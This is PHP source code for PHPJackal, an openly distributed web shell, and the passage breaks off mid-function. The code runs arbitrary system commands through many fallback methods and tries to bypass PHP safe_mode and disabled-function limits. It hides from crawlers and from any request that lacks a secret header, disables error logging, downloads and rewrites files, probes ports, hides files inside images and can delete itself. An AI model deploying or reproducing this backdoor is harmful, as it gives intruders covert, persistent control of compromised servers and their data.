<?php
/*
 * PHPJackal v3.1.0
 *
 * Nima Ghotbi
 *
 */

#---------------Configs---------#
#---General


# Email
# Your email address. (For password recovery & Logins log)
$EMail = '';

# Anti_Crawler
# True value makes PHPJackal return 404 error if it detects
# search engine crawler
$Anti_Crawler = false;

$Theme = 'style';

#---Security


# Login_Hash
# MD5 hash of login password: (Default password is "PHPJackal")
$Login_Hash = '9db153db4b95604edc8586d8043cd427';

# IP
# Allowed clients: [$IP=array('192.168.100.5','192.168.100.9');]
$IP = array ();

# OnlySSL
# Only allow HTTPS protocol [true/false]
$OnlySSL = false;

#---Stealth mode


# Required_Header_Name & Required_Header_Value
# PHPJackal return 404 error if it client request is not includes
# header name & value specified below.(Leave them blank to disable
# Stealth mode)
$Required_Header_Name = '';
$Required_Header_Value = '';

#---Misc


# Resource_Dir
# You can change it to mirror site or local directory(Should end
# with "/")
$Resource_Dir = "https://cdn.rawgit.com/nim4/PHPJackal/master/resource/";

# RFI_URL
# Script to be used for checking RFI (Tools->Security scanner)
$RFI_URL = $Resource_Dir + "rfi.txt";

# Die_in_end
# Call die() in the end of PHPJackal [true/false]
$Die_in_end = true;

# Ignore_Abort
# Whether a client disconnect should cause script to be aborted
# [true/false]
$Ignore_Abort = false;

#---------------End of Configs--#


#---------------BOF-------------#
error_reporting (0);
@ob_clean ();
ignore_user_abort ( $Ignore_Abort );
if (! isset ( $_SERVER ))
	$_SERVER = &$HTTP_SERVER_VARS;
if (! isset ( $_POST ))
	$_POST = &$HTTP_POST_VARS;
if (! isset ( $_GET ))
	$_GET = &$HTTP_GET_VARS;
if (! isset ( $_COOKIE ))
	$_COOKIE = &$HTTP_COOKIE_VARS;
if (! isset ( $_FILES ))
	$_FILES = &$HTTP_POST_FILES;
$safemode = (ini_get ( 'safe_mode' ) || strtolower ( ini_get ( 'safe_mode' ) ) == 'on') ? 'ON' : 'OFF';
$disablefunctions = ini_get ( 'disable_functions' );
$disablefunctions = explode ( ',', $disablefunctions );
function checkfunctioN($func) {
	global $disablefunctions, $safemode;
	$safe = array ('passthru', 'system', 'exec', 'shell_exec', 'popen', 'proc_open', 'dl' );
	if ($safemode == 'ON' && in_array ( $func, $safe ))
		return 0;
	elseif (function_exists ( $func ) && is_callable ( $func ) && ! in_array ( $func, $disablefunctions ))
		return 1;
	return 0;
}
if(checkfunctioN('ini_restore')){
ini_restore("safe_mode_include_dir");
ini_restore("safe_mode_exec_dir");
ini_restore("disable_functions");
ini_restore("allow_url_fopen");
ini_restore("safe_mode");
ini_restore("open_basedir");
}
if(checkfunctioN('ini_set'))
{
ini_set('max_execution_time','0');
ini_set('memory_limit','9999M');
ini_set('output_buffering',0);
ini_set('error_log',NULL);
ini_set('log_errors',0);
ini_set('file_uploads',1);
ini_set('allow_url_fopen',1);
}
else if(checkfunctioN('ini_alter'))
{
ini_alter('error_log',NULL);
ini_alter('log_errors',0);
ini_alter('file_uploads',1);
ini_alter('allow_url_fopen',1);
}
if (ini_get ( 'max_execution_time' ) != '999999' && checkfunctioN('set_time_limit'))
	set_time_limit ( 0 );
if (! checkfunctioN ( 'http_response_code' )) {
	function http_response_code($c) {
		$p = (isset ( $_SERVER ['SERVER_PROTOCOL'] )) ? $_SERVER ['SERVER_PROTOCOL'] : 'HTTP/1.0';
		header ( "$p $c Not Found" );
		exit ();
	}
}
if (! checkfunctioN ( 'apache_request_headers' )) {
	function apache_request_headers() {
		foreach ( $_SERVER as $key => $value ) {
			if (substr ( $key, 0, 5 ) == "HTTP_") {
				$key = str_replace ( " ", "-", ucwords ( strtolower ( str_replace ( "_", " ", substr ( $key, 5 ) ) ) ) );
				$out [$key] = $value;
			}
		}
		return $out;
	}
}
if ($Anti_Crawler) {
	$crawlers = 'Google|msnbot|Rambler|Yahoo|AbachoBOT|accoona|AcioRobot|ASPSeek|CocoCrawler|Dumbot|FAST-WebCrawler|GeonaBot|Gigabot|Lycos|MSRBOT|Scooter|AltaVista|IDBot|eStyle|Scrubby';
	if (strpos ( $crawlers, $_SERVER ['HTTP_USER_AGENT'] ) !== false)
		http_response_code ( 404 );
}
if ($Required_Header_Name) {
	$headers = apache_request_headers ();
	if (! array_key_exists ( $Required_Header_Name, $headers ) || $headers [$Required_Header_Name] != $Required_Header_Value)
		http_response_code ( 404 );
}
if ($OnlySSL && ! $_SERVER ['HTTPS'])
	die ( 'HTTP protocol is not allowed! try HTTP Secure.' );
$_REQUEST = array_merge ( $_GET, $_POST );
if (get_magic_quotes_gpc ()) {
	foreach ( $_REQUEST as $key => $value )
		$_REQUEST [$key] = stripslashes ( $value );
}
if (count ( $IP ) && ! in_array ( $_SERVER ['REMOTE_ADDR'], $IP ))
	die ( 'Access denied!' );
function hlinK($str = '') {
	$myvars = array ('hosT', 'useR', 'pasS', 'attacH', 'forgeT', 'serveR', 'domaiN', 'modE', 'chkveR', 'chmoD','startP', 'workingdiR', 'urL', 'cracK', 'imagE', 'namE', 'filE', 'downloaD', 'seC', 'cP', 'mV', 'rN', 'deL' );
	$ret = $_SERVER ['PHP_SELF'] . '?';
	$new = explode ( '&', $str );
	foreach ( $_GET as $key => $v ) {
		$add = 1;
		foreach ( $new as $m ) {
			$el = explode ( '=', $m );
			if ($el [0] == $key)
				$add = 0;
		}
		if ($add) {
			if (! in_array ( $key, $myvars ))
				$ret .= "$key=$v&";
		}
	}
	$ret .= $str;
	return $ret;
}
header ( 'Cache-Control: no-cache, must-revalidate' );
header ( 'Expires: Mon, 7 Aug 1988 05:00:00 GMT' );
$VERSION = '3.1.1';
$MaSe = '';
if (! empty ( $_REQUEST ['forgeT'] ) && ! empty ( $EMail )) {
	if (mail ( $EMail, 'PHPJackal Password', 'MD5 hash of your password  on ' . $_SERVER ['HTTP_HOST'] . ' is "' . $Login_Hash . '"' ))
		$MaSe = '<p class="guidelines" id="guide_1"><small><h2 color="green">E-Mail Sent! please check your inbox.</h2></small></p>';
	else
		$MaSe = '<p class="guidelines" id="guide_1"><small><h2 color="green">Error: Can not send E-Mail!</h2></small></p>';
}
if (! empty ( $Login_Hash )) {
	$Login_Hash = md5 ( $Login_Hash . "[PHPJackal]" );
	if (! empty ( $_POST ['fpassw'] )) {
		$_POST ['fpassw'] = md5 ( md5 ( $_POST ['fpassw'] ) . "[PHPJackal]" );
		if ($EMail && $Login_Hash != md5 ( $_POST ['fpassw'] ))
			mail ( $EMail, 'PHPJackal Login Log', 'Login failed  on ' . $_SERVER ['HTTP_HOST'] . ' server by ' . $_SERVER ['REMOTE_ADDR'] );
		die ( "<script type='text/javascript'>
document.cookie = 'passw=" . $_POST ['fpassw'] . "; path=/';
document.cookie = '501=" . $_POST ['form_id'] . "; path=/';
window.location = '" . hlinK () . "'
</script>" );
	}
	if (! isset ( $_COOKIE ['passw'] ) || $_COOKIE ['passw'] != $Login_Hash || ! isset ( $_COOKIE ['501'] ) || $_COOKIE ['501'] != sha1 ( $_SERVER ['HTTP_USER_AGENT'] . $_SERVER ['REMOTE_ADDR'] )) {
		$forget = (! empty ( $EMail )) ? '<a href="' . hlinK ( "forgeT=1" ) . '">Forget password!</a>' : '';
		die ( '
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>PHPJackal [Login]</title>
<link rel="shortcut icon" href="' . $Resource_Dir . 'favicon.ico" type="image/x-icon" />
<link rel="stylesheet" type="text/css" href="' . $Resource_Dir . 'login.css" media="all">
<script type="text/javascript" src="' . $Resource_Dir . 'keyboard.js" charset="UTF-8"></script>
<link rel="stylesheet" type="text/css" href="' . $Resource_Dir . 'keyboard.css">
</head>
<body id="main_body" >
	<img src="' . $Resource_Dir . 'images/phpjackal.png" />
	<img id="top" src="' . $Resource_Dir . 'images/top.png">
	<div id="form_container">
		<h1><a>Login</a></h1>
		<form id="form_351812" class="appnitro"  method="post" id="loginform" action="' . hlinK () . '">
					<div class="form_description">
			<h2>Login</h2>
			<p>Authentication required</p>
		</div>
		' . $MaSe . '
			<ul >

					<li id="li_1" >
		<label class="description" for="element_1">Password: </label>
		<div>
			<input id="element_1" name="fpassw" class="keyboardInput" type="password" maxlength="255" /><br />
		</div>' . $forget . '
		</li>

					<li class="buttons">
			    <input type="hidden" name="form_id" value="' . sha1 ( $_SERVER ['HTTP_USER_AGENT'] . $_SERVER ['REMOTE_ADDR'] ) . '" />

				<input id="saveForm" class="button_text" type="submit" name="submit" value="Sign in" />
		</li>
			</ul>
		</form>
		<div id="footer">
			<a href="://github.com/nim4/PHPJackal">PHPJackal ' . $VERSION . '</a>
		</div>
	</div>
</div>
	<img id="bottom" src="' . $Resource_Dir . 'images/bottom.png" alt="">
	<script type="text/javascript">
	p =document.getElementById("element_1");
	p.focus();
	</script>
	</body>
</html>' );
	}
}
if (! empty ( $_REQUEST ['slfrmv'] )) {
	unlink ( __FILE__ );
	die ( "<h1>Astalavista baby!</h1>" );
}
if (! empty ( $_REQUEST ['workingdiR'] ))
	chdir ( $_REQUEST ['workingdiR'] );
if (empty ( $_REQUEST ['seC'] ))
	$_REQUEST ['seC'] = 'about';
function checkthisporT($ip, $port, $timeout, $type = 0) {
	if (! $type) {
		$scan = @fsockopen ( $ip, $port, $n, $s, $timeout );
		if ($scan) {
			fclose ( $scan );
			return 1;
		}
	} elseif (checkfunctioN ( 'socket_set_timeout' )) {
		$scan = @fsockopen ( "udp://$ip", $port );
		if ($scan) {
			socket_set_timeout ( $scan, $timeout );
			fwrite ( $scan, "\x00" );
			$s = time ();
			fread ( $scan, 1 );
			if ((time () - $s) >= $timeout) {
				fclose ( $scan );
				return 1;
			}
		}
	}
	return 0;
}
if ($_REQUEST ['seC'] == 'phpinfo') {
	phpinfo ();
	exit ();
}
if (! checkfunctioN ( 'is_executable' )) {
	function is_executable($addr) {
		return 0;
	}
}
if (! checkfunctioN ( 'file_get_contents' )) {
	function file_get_contents($addr) {
		$a = fopen ( $addr, 'r' );
		$tmp = fread ( $a, filesize ( $a ) );
		fclose ( $a );
		if ($a)
			return $tmp;
		else
			return null;
	}
}
if (! checkfunctioN ( 'file_put_contents' )) {
	function file_put_contents($addr, $con) {
		$a = fopen ( $addr, 'w' );
		if (! $a)
			return 0;
		$t = fwrite ( $a, $con );
		fclose ( $a );
		if ($t)
			return strlen ( $con );
		return 0;
	}
}
function file_add_contentS($addr, $con) {
	$a = fopen ( $addr, 'a' );
	if (! $a)
		return 0;
	fwrite ( $a, $con );
	fclose ( $a );
	return strlen ( $con );
}
if (! empty ( $_REQUEST ['chmoD'] ) && ! empty ( $_REQUEST ['modE'] ))
	chmod ( $_REQUEST ['chmoD'], '0' . $_REQUEST ['modE'] );
if (! empty ( $_REQUEST ['downloaD'] )) {
	@ob_clean ();
	$dl = $_REQUEST ['downloaD'];
	$con = file_get_contents ( $dl );
	header ( 'Content-type: ' . get_mimE ( $dl ) );
	header ( "Content-disposition: attachment; filename=\"" . basename ( $dl ) . "\";" );
	header ( 'Content-length: ' . strlen ( $con ) );
	die ( $con );
}
if (! empty ( $_REQUEST ['imagE'] )) {
	$img = $_REQUEST ['imagE'];
	@ob_clean ();
	header ( 'Content-type: ' . get_mimE ( $img ) );
	header ( "Content-length: " . filesize ( $img ) );
	header ( "Last-Modified: " . date ( 'r', filemtime ( $img ) ) );
	die ( file_get_contents ( $img ) );
}
if (! empty ( $_REQUEST ['exT'] )) {
	$ex = $_REQUEST ['exT'];
	$e = get_extension_funcs ( $ex );
	if (empty ( $e ))
		die ( 'No Function!' );
	echo '<html><head><title>' . htmlspecialchars ( $ex ) . '</title></head><body><b>Functions:</b><br>';
	foreach ( $e as $k => $f ) {
		$i = $k + 1;
		echo "$i)$f ";
		if (in_array ( $f, $disablefunctions ))
			echo '<font color=red>DISABLED</font>';
		echo '<br />';
	}
	die ( '</body></html>' );
}
function showsizE($size) {
	if ($size >= 1073741824)
		$size = round ( ($size / 1073741824), 2 ) . ' GB';
	elseif ($size >= 1048576)
		$size = round ( ($size / 1048576), 2 ) . ' MB';
	elseif ($size >= 1024)
		$size = round ( ($size / 1024), 2 ) . ' KB';
	else
		$size .= ' B';
	return $size;
}
$windows = (substr ( (strtoupper ( php_uname () )), 0, 3 ) == 'WIN') ? 1 : 0;
$cwd = getcwd ();
$Banner = array ("######  #     # ######        #
#     # #     # #     #       #   ##    ####  #    #   ##   #
#     # #     # #     #       #  #  #  #    # #   #   #  #  #
######  ####### ######        # #    # #      ####   #    # #
#       #     # #       #     # ###### #      #  #   ###### #
#       #     # #       #     # #    # #    # #   #  #    # #
#       #     # #        #####  #    #  ####  #    # #    # ######", " .___  __  __ .___   _______               \             .
 /   \ |   |  /   \ '   /      ___    ___  |   ,   ___   |
 |,_-' |___|  |,_-'     |     /   ` .'   ` |  /   /   `  |
 |     |   |  |         |    |    | |      |-<   |    |  |
 /     /   /  /      `--/    `.__/|  `._.' /  \_ `.__/| /\__", " _____ _____ _____    __         _       _
|  _  |  |  |  _  |__|  |___ ___| |_ ___| |
|   __|     |   __|  |  | .'|  _| '_| .'| |
|__|  |__|__|__|  |_____|__,|___|_,_|__,|_|", ".---. .-..-..---.   .-.             .-.          .-.
: .; :: :; :: .; :  : :             : :.-.       : :
:  _.':    ::  _.'_ : : .--.   .--. : `'.' .--.  : :
: :   : :: :: :  : :; :' .; ; '  ..': . `.' .; ; : :_
:_;   :_;:_;:_;  `.__.'`.__,_;`.__.':_;:_;`.__,_;`.__;", " ____    __  __  ____    _____                   __                ___
/\  _`\ /\ \/\ \/\  _`\ /\___ \                 /\ \              /\_ \
\ \ \L\ \ \ \_\ \ \ \L\ \/__/\ \     __      ___\ \ \/'\      __  \//\ \
 \ \ ,__/\ \  _  \ \ ,__/  _\ \ \  /'__`\   /'___\ \ , <    /'__`\  \ \ \
  \ \ \/  \ \ \ \ \ \ \/  /\ \_\ \/\ \L\.\_/\ \__/\ \ \\`\ /\ \L\.\_ \_\ \_
   \ \_\   \ \_\ \_\ \_\  \ \____/\ \__/.\_\ \____\\ \_\ \_\ \__/.\_\/\____\
    \/_/    \/_/\/_/\/_/   \/___/  \/__/\/_/\/____/ \/_/\/_/\/__/\/_/\/____/", "    ____  __  ______      __           __         __
   / __ \/ / / / __ \    / /___ ______/ /______ _/ /
  / /_/ / /_/ / /_/ /_  / / __ `/ ___/ //_/ __ `/ /
 / ____/ __  / ____/ /_/ / /_/ / /__/ ,< / /_/ / /
/_/   /_/ /_/_/    \____/\__,_/\___/_/|_|\__,_/_/", "______________  __________________            ______        ______
___  __ \__  / / /__  __ \_____  /_____ _________  /_______ ___  /
__  /_/ /_  /_/ /__  /_/ /__ _  /_  __ `/  ___/_  //_/  __ `/_  /
_  ____/_  __  / _  ____// /_/ / / /_/ // /__ _  ,<  / /_/ /_  /
/_/     /_/ /_/  /_/     \____/  \__,_/ \___/ /_/|_| \__,_/ /_/", " _______ __   __ _______ ___ _______ _______ ___   _ _______ ___
|       |  | |  |       |   |   _   |       |   | | |   _   |   |
|    _  |  |_|  |    _  |   |  |_|  |       |   |_| |  |_|  |   |
|   |_| |       |   |_| |   |       |       |      _|       |   |
|    ___|       |    ___|   |       |      _|     |_|       |   |___
|   |   |   _   |   |  |    |   _   |     |_|    _  |   _   |       |
|___|   |__| |__|___|  |____|__| |__|_______|___| |_|__| |__|_______|" );
shuffle ( $Banner );
$Warning = (isset ( $_COOKIE ['passw'] ) && $_COOKIE ['passw'] == md5 ( md5 ( "PHPJackal" ) . "[PHPJackal]" )) ? '<br /><br /><font color="red"><b>WARNING: You are using default password!!!</b></font><br /><br />' : '';
$intro = '
<font onmouseover="this.style.color=\'#FF0000\';" onmouseout="this.style.color=\'#484848\';" color="#484848">
<pre>
' . $Banner [0] . '
</pre></font>' . $Warning . '<br />Version: ' . $VERSION . '<br />Author: Nima Ghotbi<br />Website: <a href="https://github.com/nim4/PHPJackal" target="_blank">https://github.com/nim4/PHPJackal</a><br /><br /><br />
<noscript><h1 color="#FF0000">JavaScript is disabled in your browser!</h1> To use this script, JavaScript must be enabled in your browser.</noscript>
<br />
<br />New in this version:<br /><br />
<ul>
<li>More safe-mode bypass methods</li>
<li>Script is more configurable</li>
<li>Better interface</li>
<li>Better security scanner</li>
</ul>';
$hcwd = "<input type=hidden name=workingdiR value='$cwd'>";
function is_eveN($num) {
	return ($num % 2 == 0);
}
function asc2biN($char) {
	return str_pad ( decbin ( ord ( $char ) ), 8, "0", STR_PAD_LEFT );
}
function rgb2biN($rgb) {
	$binstream = "";
	$red = ($rgb >> 16) & 0xFF;
	$green = ($rgb >> 8) & 0xFF;
	$blue = $rgb & 0xFF;
	if (is_eveN ( $red ))
		$binstream .= "1";
	else
		$binstream .= "0";
	if (is_eveN ( $green ))
		$binstream .= "1";
	else
		$binstream .= "0";
	if (is_eveN ( $blue ))
		$binstream .= "1";
	else
		$binstream .= "0";
	return $binstream;
}
function stegfilE($image, $fileaddr, $out) {
	$filename = basename ( $fileaddr );
	$path = dirname ( $fileaddr );
	$imagename = basename ( $image );
	$binstream = $recordstream = "";
	$make_odd = Array ();
	$pic = ImageCreateFromJPEG ( $image );
	$attributes = getImageSize ( $image );
	$outpic = ImageCreateFromJPEG ( $image );
	$data = file_get_contents ( $fileaddr );
	do {
		$boundary = chr ( rand ( 0, 255 ) ) . chr ( rand ( 0, 255 ) ) . chr ( rand ( 0, 255 ) );
	} while ( strpos ( $data, $boundary ) !== false && strpos ( $hidefile ['name'], $boundary ) !== false );
	$data = $boundary . $filename . $boundary . $data . $boundary;
	if (strlen ( $data ) * 8 > ($attributes [0] * $attributes [1]) * 3) {
		return "Cannot fit $filename in $imagename.<br />$imagename requires mask to contain at least " . (intval ( (strlen ( $data ) * 8) / 3 ) + 1) . " pixels.<br />Maximum filesize that $imagename can hide is " . intval ( (($attributes [0] * $attributes [1]) * 3) / 8 ) . " bytes";
	}
	for($i = 0; $i < strlen ( $data ); $i ++) {
		$char = $data {$i};
		$binary = asc2biN ( $char );
		$binstream .= $binary;

		for($j = 0; $j < strlen ( $binary ); $j ++) {
			$binpart = $binary {$j};
			if ($binpart == "0") {
				$make_odd [] = true;
			} else {
				$make_odd [] = false;
			}
		}
	}
	$y = 0;
	for($i = 0, $x = 0; $i < sizeof ( $make_odd ); $i += 3, $x ++) {
		$rgb = ImageColorAt ( $pic, $x, $y );
		$cols = Array ();
		$cols [] = ($rgb >> 16) & 0xFF;
		$cols [] = ($rgb >> 8) & 0xFF;
		$cols [] = $rgb & 0xFF;

		for($j = 0; $j < sizeof ( $cols ); $j ++) {
			if ($make_odd [$i + $j] === true && is_eveN ( $cols [$j] )) {
				$cols [$j] ++;
			} else if ($make_odd [$i + $j] === false && ! is_eveN ( $cols [$j] )) {
				$cols [$j] --;
			}
		}
		$temp_col = ImageColorAllocate ( $outpic, $cols [0], $cols [1], $cols [2] );
		ImageSetPixel ( $outpic, $x, $y, $temp_col );
		if ($x == ($attributes [0] - 1)) {
			$y ++;
			$x = - 1;
		}
	}
	ImagePNG ( $outpic, $out );
	return '<b>Well done!</b> <a href="' . hlink ( "seC=img&filE=$out&workingdiR=$path" ) . '">' . htmlspecialchars ( $out ) . '</a><br />';
}
function steg_recoveR($fileaddr) {
	global $cwd;
	$ascii = $boundary = $binstream = $filename = "";
	$attributes = getImageSize ( $fileaddr );
	$pic = ImageCreateFromPNG ( $fileaddr );
	if (! $pic || ! $attributes) {
		return "could not read image";
	}
	$bin_boundary = "";
	for($x = 0; $x < 8; $x ++) {
		$bin_boundary .= rgb2biN ( ImageColorAt ( $pic, $x, 0 ) );
	}
	for($i = 0; $i < strlen ( $bin_boundary ); $i += 8) {
		$binchunk = substr ( $bin_boundary, $i, 8 );
		$boundary .= chr ( bindec ( $binchunk ) );
	}
	$start_x = 8;
	for($y = 0; $y < $attributes [1]; $y ++) {
		for($x = $start_x; $x < $attributes [0]; $x ++) {
			$binstream .= rgb2biN ( ImageColorAt ( $pic, $x, $y ) );
			if (strlen ( $binstream ) >= 8) {
				$binchar = substr ( $binstream, 0, 8 );
				$ascii .= chr ( bindec ( $binchar ) );
				$binstream = substr ( $binstream, 8 );
			}
			if (strpos ( $ascii, $boundary ) !== false) {
				$ascii = substr ( $ascii, 0, strlen ( $ascii ) - 3 );
				if (empty ( $filename )) {
					$filename = $ascii;
					$ascii = "";
				} else {
					break 2;
				}
			}
		}
		$start_x = 0;
	}
	file_put_contents ( $filename, $ascii );
	return '<b>Well done!</b> <a href="' . hlink ( "seC=openit&namE=$filename&workingdiR=$cwd" ) . '">' . htmlspecialchars ( $filename ) . '</a><br />';
}

function getscriptdiR() {
	$URL = 'http';
	if (! empty ( $_SERVER ["HTTPS"] ))
		$URL .= "s";
	$URL .= "://" . $_SERVER ["SERVER_NAME"];
	if ($_SERVER ["SERVER_PORT"] != "80")
		$URL .= ":" . $_SERVER ["SERVER_PORT"];
	$URL .= str_replace ( DIRECTORY_SEPARATOR, '/', dirname ( $_SERVER ["SCRIPT_NAME"] ) );
	return $URL;
}
function ssishelL($command) {
	$name = uniqid ( 'ssi_' ) . '.shtml';
	$x = "<!--#exec cmd='$command' -->";
	file_put_contents ( $name, $x );
	$con = getiT ( getscriptdiR () . $name, $headers);
	unlink ( $name );
	if (strstr ( $x, $con ) != false)
		return null;
	return $con;
}

function perlwshelL($command) {
	$name = uniqid ( 'ssi_' ) . '.pl';
	$x = '#!/usr/bin/perl
system("' . $command . '");';
	file_put_contents ( $name, $x );
	$con = getiT ( getscriptdiR () . $name, $headers);
	unlink ( $name );
	if (strstr ( $x, $con ) != false)
		return null;
	return $con;
}
function whereistmP() {
	$uploadtmp = ini_get ( 'upload_tmp_dir' );
	$uf = getenv ( 'USERPROFILE' );
	$af = getenv ( 'ALLUSERSPROFILE' );
	$se = ini_get ( 'session.save_path' );
	$envtmp = (getenv ( 'TMP' )) ? getenv ( 'TMP' ) : getenv ( 'TEMP' );
	if (is_dir ( '/tmp' ) && is_writable ( '/tmp' ))
		return '/tmp';
	if (is_dir ( '/usr/tmp' ) && is_writable ( '/usr/tmp' ))
		return '/usr/tmp';
	if (is_dir ( '/var/tmp' ) && is_writable ( '/var/tmp' ))
		return '/var/tmp';
	if (is_dir ( $uf ) && is_writable ( $uf ))
		return $uf;
	if (is_dir ( $af ) && is_writable ( $af ))
		return $af;
	if (is_dir ( $se ) && is_writable ( $se ))
		return $se;
	if (is_dir ( $uploadtmp ) && is_writable ( $uploadtmp ))
		return $uploadtmp;
	if (is_dir ( $envtmp ) && is_writable ( $envtmp ))
		return $envtmp;
	return '.';
}
function shelL($command) {
	global $windows;
	$exec = $output = '';
	$dep [] = array ('pipe', 'r' );
	$dep [] = array ('pipe', 'w' );
	if (checkfunctioN ( 'passthru' )) {
		ob_start ();
		passthru ( $command );
		$exec = ob_get_contents ();
		ob_clean ();
		ob_end_clean ();
	} elseif (checkfunctioN ( 'system' )) {
		$tmp = ob_get_contents ();
		ob_clean ();
		system ( $command );
		$output = ob_get_contents ();
		ob_clean ();
		$exec = $tmp;
	} elseif (checkfunctioN ( 'exec' )) {
		exec ( $command, $output );
		$output = join ( "\n", $output );
		$exec = $output;
	} elseif (checkfunctioN ( 'shell_exec' ))
		$exec = shell_exec ( $command );
	elseif (checkfunctioN ( 'popen' )) {
		$output = popen ( $command, 'r' );
		while ( ! feof ( $output ) ) {
			$exec = fgets ( $output );
		}
		pclose ( $output );
	} elseif (checkfunctioN ( 'proc_open' )) {
		$res = proc_open ( $command, $dep, $pipes );
		while ( ! feof ( $pipes [1] ) ) {
			$line = fgets ( $pipes [1] );
			$output .= $line;
		}
		$exec = $output;
		proc_close ( $res );
	} elseif (checkfunctioN ( 'win_shell_execute' ))
		$exec = winshelL ( $command );
	elseif (checkfunctioN ( 'win32_create_service' ))
		$exec = srvshelL ( $command );
	elseif (extension_loaded ( 'ffi' ) && $windows)
		$exec = ffishelL ( $command );
	elseif (extension_loaded ( 'perl' ))
		$exec = perlshelL ( $command );
	elseif (extension_loaded ( 'python' ))
		$exec = pythonshelL ( $command );
	elseif ($windows && class_exists ( 'COM' )) {
		$ws = new COM ( 'WScript.Shell' );
		$exec = comshelL ( $command, $ws );
	}elseif (is_writable ( dirname ( $_SERVER ["SCRIPT_FILENAME"] ) )){
		$exec = perlwshelL ( $command );
        if (!$exec)
            $exec = ssishelL ( $command );
    }
	return $exec;
}
function getiT($get, &$headers, $method = 'GET', $body = "") {
    $user_agent = "Mozilla/5.0 (compatible; Konqueror/3.1; FreeBSD)";
	if (checkfunctioN ( "curl_init" )) {
		$ch = curl_init ();
		curl_setopt ( $ch, CURLOPT_USERAGENT, $user_agent );
		curl_setopt ( $ch, CURLOPT_TIMEOUT, 40 );
		curl_setopt ( $ch, CURLOPT_SSL_VERIFYHOST, 0 );
		curl_setopt ( $ch, CURLOPT_SSL_VERIFYPEER, 0 );
		curl_setopt ( $ch, CURLOPT_URL, $get );
		curl_setopt ( $ch, CURLOPT_RETURNTRANSFER, TRUE );
		curl_setopt ( $ch, CURLOPT_REFERER, "http://google.com" );
		curl_setopt ( $ch, CURLOPT_HEADER, TRUE );
        if($method == 'POST'){
            curl_setopt ( $ch, CURLOPT_POST, 1);
            curl_setopt ( $ch, CURLOPT_POSTFIELDS, $body);
        }

		$con = curl_exec ( $ch );
        $t = explode("\r\n\r\n", $con, 2);
        $head = explode("\n", $t[0]);
        foreach($head as $v) {
            $tmp = explode(": ", rtrim($v), 2);
            if(count($tmp) == 2)
                $headers[$tmp[0]] = $tmp[1];
        }
        return $t[1];
	}else{
        $u = parse_url($get);
        $h = "";
        foreach(apache_request_headers() as $k => $v)
            if($k != "Host" && $k != "Accept-Encoding")
                $h .= "$k: $v\r\n";
        $h .= "Accept-Encoding: text\r\n";
        $stream_context = array(
                'method'=>   $method,
                'header'=>    $h,
                'user_agent'=> $user_agent
        );

        if($method == 'POST'){
            $stream_context['content'] = $body;
        }
        $file_pointer = fopen($get, 'r', null, stream_context_create(array($u['scheme'] => $stream_context)));
        $meta = stream_get_meta_data($file_pointer);
        $head = array();
        if(array_key_exists('wrapper_data', $meta)){
            $head = $meta['wrapper_data'];
        }
        foreach($head as $v) {
            $tmp = explode(": ", rtrim($v), 2);
            if(count($tmp) == 2)
                $headers[$tmp[0]] = $tmp[1];
        }
        $con = stream_get_contents($file_pointer);
        return $con;
    }

}
function downloadiT($get, $put) {
    $headers = array();
	$con = getiT ( $get, $headers );
	$mk = file_put_contents ( $put, $con );
	if ($mk)
		return 1;
	return 0;
}
if (! empty ( $_REQUEST ['p0d'] )) {
	$urL = base64_decode ( $_REQUEST ['p0d'] );
	$u = parse_url ( $urL );
	$host = $u ['host'];
	$file = (! empty ( $u ['path'] )) ? $u ['path'] : '/';
	$port = (! empty ( $u ['port'] )) ? ':' . $u ['port'] : '';
	$dir = str_replace ( DIRECTORY_SEPARATOR, '/', dirname ( $file ) );
    $headers = array();
	$con = getiT ( $urL , $headers, $_SERVER['REQUEST_METHOD'], file_get_contents('php://input'));
    if(array_key_exists("Content-Type", $headers) ) {
        switch ($headers["Content-Type"]) {
            case "image/jpeg" :
                header("Content-type: image/jpeg");
                die ($con);
            case "image/gif" :
                header("Content-type: image/gif");
                die ($con);
            case "image/png" :
                header("Content-type: image/png");
                die ($con);
            case "image/x-icon" :
                header("Content-type: image/x-icon");
                die ($con);
            case "text/css" :
                header("Content-type: text/css");
                die ($con);
            case "text/xml" :
                header("Content-type: text/xml");
                die ($con);
            case "application/x-javascript" :
                header("Content-type: application/x-javascript");
                die ($con);
        }
    }
    if(array_key_exists("Set-Cookie", $headers)){
        header("Set-Cookie: " . $headers["Set-Cookie"]);
    }
    if(array_key_exists("Location", $headers)){
        $tmp = $headers["Location"];
        if (substr ( $tmp, 0, 4 ) != 'http') {
            $pre = $u ['scheme'] . "://" . $u ['host'] . $port;
            if ($url {0} != '/')
                $pre .= $dir;
        }
        header("Location: " . hlinK ( 'p0d=' . base64_encode ( $pre . $tmp ) ));
    }

	$dom = new DOMDocument ( );
	@$dom->loadHTML ( $con );
	$dom->preserveWhiteSpace = false;
	$xpath = new DOMXPath ( $dom );
	$hrefs = $xpath->evaluate ( "/html/body//a" );
	for($i = 0; $i < $hrefs->length; $i ++) {
		$href = $hrefs->item ( $i );
		$url = $href->getAttribute ( 'href' );
		if (! empty ( $url )) {
			$pre = '';
			if (substr ( $url, 0, 4 ) != 'http') {
				$pre = $u ['scheme'] . "://" . $u ['host'] . $port;
				if ($url {0} != '/')
					$pre .= $dir;
			}
			$url = $pre . $url;
			$href->removeAttribute ( 'href' );
			$href->setAttribute ( "href", hlinK ( 'p0d=' . base64_encode ( $url ) ) );
		}
	}
	$sources = $xpath->evaluate ( "/html/body//img" );
	for($i = 0; $i < $sources->length; $i ++) {
		$src = $sources->item ( $i );
		$url = $src->getAttribute ( 'src' );
		if (! empty ( $url )) {
			$pre = '';
			if (substr ( $url, 0, 4 ) != 'http') {
				$pre = $u ['scheme'] . "://" . $u ['host'] . $port;
				if ($url {0} != '/')
					$pre .= $dir;
			}
			$url = $pre . $url;
			$src->removeAttribute ( 'src' );
			$src->setAttribute ( "src", hlinK ( 'p0d=' . base64_encode ( $url ) ) );
		}
	}
	$css = $xpath->evaluate ( "/html//link" );
	for($i = 0; $i < $css->length; $i ++) {
		$href = $css->item ( $i );
		$url = $href->getAttribute ( 'href' );
		if (! empty ( $url )) {
			$pre = '';
			if (substr ( $url, 0, 4 ) != 'http') {
				$pre = $u ['scheme'] . "://" . $u ['host'] . $port;
				if ($url {0} != '/')
					$pre .= $dir;
			}
			$url = $pre . $url;
			$href->removeAttribute ( 'href' );
